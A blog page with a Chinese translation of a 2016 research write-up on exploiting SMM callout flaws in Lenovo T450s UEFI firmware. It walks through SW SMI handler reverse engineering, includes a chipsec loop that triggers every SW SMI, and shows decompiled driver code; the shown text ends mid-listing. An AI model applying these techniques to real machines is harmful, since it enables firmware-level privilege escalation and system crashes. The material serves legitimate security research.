<!DOCTYPE html>


<html theme="dark" showBanner="true" hasBanner="true" > 
<link href="/project/fontawesome/css/fontawesome.css" rel="stylesheet">
<link href="/project/fontawesome/css/brands.css" rel="stylesheet">
<link href="/project/fontawesome/css/solid.css" rel="stylesheet">
<script src="/project/js/color.global.min.js" ></script>
<script src="/project/js/load-settings.js" ></script>
<head>
  <meta charset="utf-8">
  
  
  <title>Lenovo固件中的SMM callout漏洞利用 | Edvison&#39;s blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="原文：http:&#x2F;&#x2F;blog.cr4.sh&#x2F;2016&#x2F;02&#x2F;exploiting-smm-callout-vulnerabilities.html">
<meta property="og:type" content="article">
<meta property="og:title" content="Lenovo固件中的SMM callout漏洞利用">
<meta property="og:url" content="https://edvison.github.io/project/2023/08/09/Lenovo%E5%9B%BA%E4%BB%B6%E4%B8%AD%E7%9A%84SMM-callout%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/index.html">
<meta property="og:site_name" content="Edvison&#39;s blog">
<meta property="og:description" content="原文：http:&#x2F;&#x2F;blog.cr4.sh&#x2F;2016&#x2F;02&#x2F;exploiting-smm-callout-vulnerabilities.html">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809162859686.png">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809162922858.png">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809162946080.png">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809163016403.png">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809163032691.png">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809163042807.png">
<meta property="article:published_time" content="2023-08-09T08:28:27.000Z">
<meta property="article:modified_time" content="2023-08-09T08:31:04.288Z">
<meta property="article:author" content="edvison">
<meta property="article:tag" content="UEFI">
<meta property="article:tag" content="漏洞利用">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809162859686.png">
  
    <link rel="alternate" href="/project/atom.xml" title="Edvison's blog" type="application/atom+xml">
  
  
    <link rel="icon" media="(prefers-color-scheme: light)" href="/project/images/favicon-light-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/project/images/favicon-light-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/project/images/favicon-light-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/project/images/favicon-light-192.png" sizes="192x192">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/project/images/favicon-dark-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/project/images/favicon-dark-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/project/images/favicon-dark-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/project/images/favicon-dark-192.png" sizes="192x192">
  
  
<link rel="stylesheet" href="/project/css/style.css">

<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  
  
    
<div id="banner" class="">
  <img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/20230807175151.png" itemprop="image">
  <div id="banner-dim"></div>
</div>
 
   
  <div id="main-grid" class="shadow   ">
    <div id="nav" class=""  >
      <navbar id="navbar">
  <nav id="title-nav">
    <a href="/project/">
      <div id="vivia-logo">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
      </div>
      <div>Edvison's blog </div>
    </a>
  </nav>
  <nav id="main-nav">
    
      <a class="main-nav-link" href="/project/">Home</a>
    
      <a class="main-nav-link" href="/project/archives">Archives</a>
    
      <a class="main-nav-link" href="/project/about">About</a>
    
  </nav>
  <nav id="sub-nav">
    <a id="theme-btn" class="nav-icon">
      <span class="material-symbols-rounded light-mode-icon">wb_sunny</span>
      <span class="material-symbols-rounded dark-mode-icon">dark_mode</span>
    </a>
    
      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/project/atom.xml" title="RSS 订阅">
        <span class="material-symbols-rounded rss">rss_feed</span>
      </a>
    
    <a id="nav-search-btn" class="nav-icon" title="搜索" style="display: none;">
      <span class="material-symbols-rounded">search</span>
    </a>
    <div id="nav-menu-btn" class="nav-icon">
      <span class="material-symbols-rounded">menu</span>
    </div>
  </nav>
</navbar>
<div id="nav-dropdown" class="hidden">
  <div id="dropdown-link-list">
    
      <a class="nav-dropdown-link" href="/project/">Home</a>
    
      <a class="nav-dropdown-link" href="/project/archives">Archives</a>
    
      <a class="nav-dropdown-link" href="/project/about">About</a>
    
    
      <a class="nav-dropdown-link" href="/project/atom.xml" title="RSS 订阅">RSS</a>
     
    </div>
</div>
<script>
  let dropdownBtn = document.getElementById("nav-menu-btn");
  let dropdownEle = document.getElementById("nav-dropdown");
  dropdownBtn.onclick = function() {
    dropdownEle.classList.toggle("hidden");
  }
</script>
    </div>
    <div id="sidebar-wrapper">
      <sidebar id="sidebar">
  
    <div class="widget-wrap">
  <div class="info-card">
    <div class="avatar">
      
        <image src=https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/20230808155156.png></image>
      
      <div class="img-dim"></div>
    </div>
    <div class="info">
      <div class="username">Edvison </div>
      <div class="dot"></div>
      <div class="subtitle">flung out of space </div>
      <div class="link-list">
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com/Edvison" title="github"><i class="fa-brands fa-github"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://weibo.com/u/6038772011" title="weibo"><i class="fa-brands fa-weibo"></i></a>
         
      </div>  
    </div>
  </div>
</div>

  
  <div class="sticky">
    
      


  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">分类</h3>
      <div class="category-box">
            <a class="category-link" href="/project/categories/UEFI%E5%8E%9F%E7%90%86/">
                UEFI原理
                <div class="category-count">3</div>
            </a>
        
            <a class="category-link" href="/project/categories/UEFI%E5%9B%BA%E4%BB%B6%E5%AE%89%E5%85%A8/">
                UEFI固件安全
                <div class="category-count">6</div>
            </a>
        
            <a class="category-link" href="/project/categories/MBR%E5%8E%9F%E7%90%86/">
                MBR原理
                <div class="category-count">2</div>
            </a>
        
            <a class="category-link" href="/project/categories/%E7%BF%BB%E8%AF%91/">
                翻译
                <div class="category-count">4</div>
            </a>
        
            <a class="category-link" href="/project/categories/Grub2%E5%8E%9F%E7%90%86/">
                Grub2原理
                <div class="category-count">1</div>
            </a>
        
            <a class="category-link" href="/project/categories/IoT%E5%AE%89%E5%85%A8/">
                IoT安全
                <div class="category-count">1</div>
            </a>
        
            <a class="category-link" href="/project/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/">
                硬件安全
                <div class="category-count">4</div>
            </a>
        
            <a class="category-link" href="/project/categories/VBIOS%E4%BF%AE%E6%94%B9/">
                VBIOS修改
                <div class="category-count">1</div>
            </a>
        </div>
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">标签</h3>
      <ul class="widget-tag-list" itemprop="keywords"><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/CSM/" rel="tag">CSM</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/DMA%E6%94%BB%E5%87%BB/" rel="tag">DMA攻击</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/Grub2/" rel="tag">Grub2</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/HID%E6%94%BB%E5%87%BB/" rel="tag">HID攻击</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/MBR/" rel="tag">MBR</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/MBR%E5%90%8E%E9%97%A8/" rel="tag">MBR后门</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/OS-Loader/" rel="tag">OS Loader</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/OVMF%E7%BC%96%E8%AF%91/" rel="tag">OVMF编译</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/PCH/" rel="tag">PCH</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/SMM/" rel="tag">SMM</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/SMM%E5%90%8E%E9%97%A8/" rel="tag">SMM后门</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/SMM%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">SMM漏洞分析</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/UEFI/" rel="tag">UEFI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/VBIOS/" rel="tag">VBIOS</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/pcie/" rel="tag">pcie</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E5%86%99%E4%BF%9D%E6%8A%A4/" rel="tag">写保护</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E5%86%99%E4%BF%9D%E6%8A%A4%E7%AA%81%E7%A0%B4/" rel="tag">写保护突破</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E5%8E%9F%E7%90%86/" rel="tag">原理</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E5%AE%89%E5%85%A8%E5%90%AF%E5%8A%A8/" rel="tag">安全启动</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E5%BC%80%E5%8F%91%E6%9D%BF/" rel="tag">开发板</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/" rel="tag">树莓派</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" rel="tag">漏洞利用</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/" rel="tag">漏洞扫描</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" rel="tag">环境搭建</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E7%94%B5%E6%BA%90%E6%95%85%E9%9A%9C/" rel="tag">电源故障</a></li></ul>
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">归档</h3>
      
      
        <a class="archive-link" href="/project/archives/2023/08 ">
          八月 2023 
          <div class="archive-count">22 </div>
        </a>
      
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">最新文章</h3>
      <ul>
        
          <a class="recent-link" href="/project/2023/08/09/Lenovo%E5%9B%BA%E4%BB%B6%E4%B8%AD%E7%9A%84SMM-callout%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" title="Lenovo固件中的SMM callout漏洞利用" >
            <div class="recent-link-text">
              Lenovo固件中的SMM callout漏洞利用
            </div>
          </a>
        
          <a class="recent-link" href="/project/2023/08/09/%E5%88%A9%E7%94%A8DMA%E6%94%BB%E5%87%BB%E7%AA%81%E7%A0%B4UEFI%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/" title="利用DMA攻击突破UEFI安全机制" >
            <div class="recent-link-text">
              利用DMA攻击突破UEFI安全机制
            </div>
          </a>
        
          <a class="recent-link" href="/project/2023/08/09/UEFI-%E5%BC%95%E5%AF%BC%E8%84%9A%E6%9C%AC%E8%A1%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" title="UEFI 引导脚本表漏洞利用" >
            <div class="recent-link-text">
              UEFI 引导脚本表漏洞利用
            </div>
          </a>
        
          <a class="recent-link" href="/project/2023/08/09/%E5%9F%BA%E4%BA%8EUEFI%E5%B9%B3%E5%8F%B0%E7%9A%84SMM%E5%90%8E%E9%97%A8%E6%9E%84%E5%BB%BA/" title="基于UEFI平台的SMM后门构建" >
            <div class="recent-link-text">
              基于UEFI平台的SMM后门构建
            </div>
          </a>
        
          <a class="recent-link" href="/project/2023/08/09/P4wnP1%E9%85%8D%E7%BD%AE%E4%B8%8E%E4%BD%BF%E7%94%A8/" title="P4wnP1配置与使用" >
            <div class="recent-link-text">
              P4wnP1配置与使用
            </div>
          </a>
        
      </ul>
    </div>
  </div>

    
  </div>
</sidebar>
    </div>
    <div id="content-body">
       

<article id="post-Lenovo固件中的SMM-callout漏洞利用" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
    
   
  <div class="article-inner">
    <div class="article-main">
      <header class="article-header">
        
<div class="main-title-bar">
  <div class="main-title-dot"></div>
  
    
      <h1 class="p-name article-title" itemprop="headline name">
        Lenovo固件中的SMM callout漏洞利用
      </h1>
    
  
</div>

        <div class='meta-info-bar'>
          <div class="meta-info">
  <time class="dt-published" datetime="2023-08-09T08:28:27.000Z" itemprop="datePublished">2023-08-09</time>
</div>
          <div class="need-seperator meta-info">
            <div class="meta-cate-flex">
  
  <a class="meta-cate-link" href="/project/categories/%E7%BF%BB%E8%AF%91/">翻译</a>
   
</div>
  
          </div>
          <div class="wordcount need-seperator meta-info">
            8.4k 词 
          </div>
        </div>
        
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/project/tags/UEFI/" rel="tag">UEFI</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/project/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" rel="tag">漏洞利用</a></li></ul>

      </header>
      <div class="e-content article-entry" itemprop="articleBody">
        
          <p>原文：<a target="_blank" rel="noopener" href="http://blog.cr4.sh/2016/02/exploiting-smm-callout-vulnerabilities.html">http://blog.cr4.sh/2016/02/exploiting-smm-callout-vulnerabilities.html</a></p>
 <span id="more"></span>

<h1 id="SMI-handlers-逆向分析"><a href="#SMI-handlers-逆向分析" class="headerlink" title="SMI handlers 逆向分析"></a>SMI handlers 逆向分析</h1><p>此类漏洞的攻击模型非常简单：系统管理中断（SW SMI）handlers代码是平台固件的一部分，该平台固件在系统管理模式RAM（SMRAM）中运行——SMRAM为物理内存的隔离区域，无法从任何操作系统代码进行访问。固件可以使用0到255的数字注册多个SW SMI handlers（通常，在实际的计算机中最多几十个）。如果handlers代码尝试访问或执行任何可能被攻击者修改地非SMRAM内存，则操作系统可以通过将handler编号写入APMC I&#x2F;O端口B2h来触发SW SMI —— 这就导致了SMM代码的任意执行（ring0 到 SMM的提权）。</p>
<p>关于Lenovo T450s，它虽然具有我们所寻找的漏洞，但其他的都不太好搞定:</p>
<ul>
<li>这是一个相对较新的TinkPad模型：没有明显的漏洞（no lame）或众所周知的BIOS漏洞（如未锁定的BIOS_CNTL，SMRAM缓存漏洞等）。而且Lenovo绝对不是最lame的平台安全供应商（实际上它的固件要比Apple的更好）。</li>
<li>T450s不存在UEFI boot script table漏洞 —— 它的固件使用<a target="_blank" rel="noopener" href="https://firmware.intel.com/sites/default/files/A_Tour_Beyond_BIOS_Implementing_S3_resume_with_EDKII.pdf">SMM lockbox</a>来保护boot script table的内容，以防止来自操作系统的未授权修改。这意味着我们不能利用DMA攻击来获取SMRAM dump。</li>
<li>该模型还使用了Intel BootGuard技术来保护固件Image免受未经授权的修改。即使拥有物理访问权限和编程器的攻击者将受感染的固件直接主板上的SPI闪存芯片中该固件也不会被硬件接受 —— 因为在启用BootGuard的平台上，CPU在执行<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Reset_vector">reset向量</a>之前会以silicon(microcode?)的级别验证固件数字签名。这意味着我们无法使用UEFI SMM后门访问SMM内存，受感染的系统将无法启动。</li>
</ul>
<p>因此，没有SMRAM dump，就没有任何简单的方法来获取SMI handlers列表，最好的办法就是获取T450s的固件Image（我使用了CHIPSEC框架中的<code>chipsec_util.py</code>在操作系统中完成Image dump），然后将其解析为固件文件系统（FFS）来提取SMM驱动程序，并手动进行逆向分析，以确定它们在平台初始化期间注册了哪些SW SMI handlers。我的T450s为1.11版本（JBET46WW）的过时固件，下面将提供此固件所有的二进制信息。</p>
<p>在使用<code>chipsec_util.py</code> dump闪存时，我发现它可以在许多其他功能中从命令行生成SW SMI，因此，我不抱着太大希望地输入了以下命令来触发所有可能的SW SMI handlers（从0到255）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># for i in &#123;0..255&#125;; do python chipsec_util.py smi 0 $i 0; done</span><br></pre></td></tr></table></figure>

<p>当编号为3的SW SMI触发后不久，测试机完全挂起了——这意味这Lenovo SMI handlers的代码质量实际上比我预想的还要差。显然，即使是最简单的SMI fuzzing也未进行过测试，这样的错误会出现在生产代码中只有一个原因 —— 编号为3的SW SMI已被某些legacy UEFI SMM驱动程序注册，且从未被平台固件或操作系统的任何组件所使用（至少在runtime阶段如此）。</p>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809162859686.png" alt="image-20230809162859686"></p>
<p>但是，除了SW SMI handlers编号之外，我们不知道该漏洞的其他具体细节。因此，要找到有漏洞的SMM驱动程序就需要对UEFI固件中的SMM驱动程序进行手动逆向分析。</p>
<p><a href="PI_1_4.zip">Platform Initialization Specification</a>的第4章“System Management Mode Core Interface”中有说明：SMM驱动程序使用<a target="_blank" rel="noopener" href="https://github.com/tianocore/edk2/blob/7a0ce8c572dff07cef82d7699da39ef52adbf523/IntelFrameworkPkg/Include/Protocol/SmmSwDispatch.h">EFI_SMM_SW_DISPATCH_PROTOCOL</a>的<code>Register()</code>函数来注册SW SMI handlers，下面是开源项目<a target="_blank" rel="noopener" href="https://github.com/tianocore/edk2">EFI Development Kit</a>的头文件中关于该协议的定义：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">//</span><br><span class="line">// Global ID for the SW SMI Protocol</span><br><span class="line">//</span><br><span class="line">#define EFI_SMM_SW_DISPATCH_PROTOCOL_GUID \</span><br><span class="line">  &#123; \</span><br><span class="line">    0xe541b773, 0xdd11, 0x420c, &#123;0xb0, 0x26, 0xdf, 0x99, 0x36, 0x53, 0xf8, 0xbf &#125; \</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">//</span><br><span class="line">// Related Definitions</span><br><span class="line">//</span><br><span class="line">// A particular chipset may not support all possible software SMI input values.</span><br><span class="line">// For example, the ICH supports only values 00h to 0FFh.  The parent only allows a single</span><br><span class="line">// child registration for each SwSmiInputValue.</span><br><span class="line">//</span><br><span class="line">typedef struct &#123;</span><br><span class="line">  UINTN SwSmiInputValue;</span><br><span class="line">&#125; EFI_SMM_SW_DISPATCH_CONTEXT;</span><br><span class="line"> </span><br><span class="line">//</span><br><span class="line">// Member functions</span><br><span class="line">//</span><br><span class="line">/*</span><br><span class="line">  Dispatch function for a Software SMI handler.</span><br><span class="line"> </span><br><span class="line">  @param  DispatchHandle        The handle of this dispatch function.</span><br><span class="line">  @param  DispatchContext       The pointer to the dispatch function&#x27;s context.</span><br><span class="line">                                The SwSmiInputValue field is filled in</span><br><span class="line">                                by the software dispatch driver prior to</span><br><span class="line">                                invoking this dispatch function.</span><br><span class="line">                                The dispatch function will only be called</span><br><span class="line">                                for input values for which it is registered.</span><br><span class="line">  @return None</span><br><span class="line">*/</span><br><span class="line">typedef</span><br><span class="line">VOID</span><br><span class="line">(EFIAPI *EFI_SMM_SW_DISPATCH)(</span><br><span class="line">  IN  EFI_HANDLE                    DispatchHandle,</span><br><span class="line">  IN  EFI_SMM_SW_DISPATCH_CONTEXT   *DispatchContext</span><br><span class="line">  );</span><br><span class="line"> </span><br><span class="line">/*</span><br><span class="line">  Register a child SMI source dispatch function with a parent SMM driver.</span><br><span class="line"> </span><br><span class="line">  @param  This                  The pointer to the EFI_SMM_SW_DISPATCH_PROTOCOL instance.</span><br><span class="line">  @param  DispatchFunction      The function to install.</span><br><span class="line">  @param  DispatchContext       The pointer to the dispatch function&#x27;s context.</span><br><span class="line">                                Indicates to the register</span><br><span class="line">                                function the Software SMI input value for which</span><br><span class="line">                                to invoke the dispatch function.</span><br><span class="line">  @param  DispatchHandle        The handle generated by the dispatcher to track</span><br><span class="line">                                the function instance.</span><br><span class="line"> </span><br><span class="line">  @retval EFI_SUCCESS           The dispatch function has been successfully</span><br><span class="line">                                registered and the SMI source has been enabled.</span><br><span class="line">  @retval EFI_DEVICE_ERROR      The SW driver could not enable the SMI source.</span><br><span class="line">  @retval EFI_OUT_OF_RESOURCES  Not enough memory (system or SMM) to manage this</span><br><span class="line">                                child.</span><br><span class="line">  @retval EFI_INVALID_PARAMETER DispatchContext is invalid. The SW SMI input value</span><br><span class="line">                                is not within valid range.</span><br><span class="line">*/</span><br><span class="line">typedef</span><br><span class="line">EFI_STATUS</span><br><span class="line">(EFIAPI *EFI_SMM_SW_REGISTER)(</span><br><span class="line">  IN EFI_SMM_SW_DISPATCH_PROTOCOL          *This,</span><br><span class="line">  IN EFI_SMM_SW_DISPATCH                   DispatchFunction,</span><br><span class="line">  IN EFI_SMM_SW_DISPATCH_CONTEXT           *DispatchContext,</span><br><span class="line">  OUT EFI_HANDLE                           *DispatchHandle</span><br><span class="line">  );</span><br><span class="line"> </span><br><span class="line">//</span><br><span class="line">// Interface structure for the SMM Software SMI Dispatch Protocol</span><br><span class="line">//</span><br><span class="line">struct _EFI_SMM_SW_DISPATCH_PROTOCOL &#123;</span><br><span class="line">  //</span><br><span class="line">  // Installs a child service to be dispatched by this protocol.</span><br><span class="line">  //</span><br><span class="line">  EFI_SMM_SW_REGISTER   Register;</span><br><span class="line"> </span><br><span class="line">  //</span><br><span class="line">  // Removes a child service dispatched by this protocol.</span><br><span class="line">  //</span><br><span class="line">  EFI_SMM_SW_UNREGISTER UnRegister;</span><br><span class="line"> </span><br><span class="line">  //</span><br><span class="line">  // A read-only field that describes the maximum value that can be used</span><br><span class="line">  // in the EFI_SMM_SW_DISPATCH_PROTOCOL.Register() service.</span><br><span class="line">  //</span><br><span class="line">  UINTN                 MaximumSwiValue;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>使用UEFITool查找实现该协议的UEFI驱动程序，根据协议的GUID进行搜索：</p>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809162922858.png" alt="image-20230809162922858"></p>
<p>在T450s的固件中根据EFI_SMM_SW_DISPATCH_PROTOCOL的GUID找到了近20种不同的UEFI驱动程序，就所需要的分析的资源而言，它并不多——在我其他的测试机上，SMI handlers代码非常简单且对逆向分析十分友好。</p>
<p>经过几个小时的分析，我终于找到了导致SW SMI handler 3崩溃的UEFI驱动程序。该驱动程序的FFS GUID是<code>124A2E7A-1949-483E-899F-6032904CA0A7</code>，它的image上还有name string：<code>SystemSmmAhciAspiLegacyRt  </code>(在module&#x2F;function&#x2F;whatever中使用了“legacy”一词的image中通常能够在内部找到一些有趣的东西)：</p>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809162946080.png" alt="image-20230809162946080"></p>
<p><code>SystemSmmAhciAspiLegacyRt</code>驱动在入口点获取<code>EFI_SMM_BASE_PROTOCOL</code>、<code>EFI_SMM_SW_DISPATCH_PROTOCOL</code>、<code>EFI_SMM_CPU_PROTOCOL</code>和其他DXE和SMM阶段需要的协议。然后它调用<code>EFI_SMM_SW_DISPATCH_PROTOCOL</code>的<code>Register()</code>函数来将<code>sub_3DC()</code>函数注册为SW SMI handler。v5变量作为<code>Register()</code>调用的参数，该变量指向<code>SwSmiInputValue </code>字段值为-1(0xffffffff)的<code>EFI_SMM_SW_DISPATCH_CONTEXT </code>结构体——根据UEFI SMM规范，这意味着在handlers注册期间，固件必须自动选择0到255之间的可用handlers编号（一般为最低的），然后将该编号返回给调用函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">EFI_STATUS __stdcall <span class="title function_">EntryPoint</span><span class="params">(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable)</span></span><br><span class="line">&#123;</span><br><span class="line">    __int64 v2; <span class="comment">// r9@0</span></span><br><span class="line">    <span class="type">int</span> v3; <span class="comment">// rax@2</span></span><br><span class="line">    __int64 v5; <span class="comment">// [sp+20h] [bp-28h]@7</span></span><br><span class="line">    EFI_SMM_SW_DISPATCH_PROTOCOL *gEfiSmmSwDispatchProtocol; <span class="comment">// [sp+28h] [bp-20h]@2</span></span><br><span class="line">    __int64 v7; <span class="comment">// [sp+30h] [bp-18h]@7</span></span><br><span class="line">    BOOLEAN InSmm; <span class="comment">// [sp+60h] [bp+18h]@1</span></span><br><span class="line">    <span class="type">int</span> (__fastcall **v9)(_QWORD, _QWORD); <span class="comment">// [sp+68h] [bp+20h]@3</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">// initialise global variables, locate protocols, etc.</span></span><br><span class="line">    sub_9E0(ImageHandle, SystemTable, &amp;InSmm, v2);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (!InSmm ||</span><br><span class="line">        (v3 = gBS-&gt;LocateProtocol(</span><br><span class="line">            &amp;gEfiSmmSwDispatchProtocolGuid,</span><br><span class="line">            <span class="number">0</span>i64,</span><br><span class="line">            &amp;gEfiSmmSwDispatchProtocol), v3 &gt;= <span class="number">0</span>) &amp;&amp;</span><br><span class="line"> </span><br><span class="line">        gEfiSmmBaseProtocol-&gt;GetSmstLocation(</span><br><span class="line">            gEfiSmmBaseProtocol,</span><br><span class="line">            &amp;gSmst),</span><br><span class="line"> </span><br><span class="line">        v3 = gBS-&gt;LocateProtocol(</span><br><span class="line">            &amp;gPhoenixEfiSmmSwSmiProtocolGuid,</span><br><span class="line">            <span class="number">0</span>i64,</span><br><span class="line">            &amp;v9), v3 &gt;= <span class="number">0</span>) &amp;&amp; (v3 = sub_3A0(), v3 &gt;= <span class="number">0</span>) &amp;&amp;</span><br><span 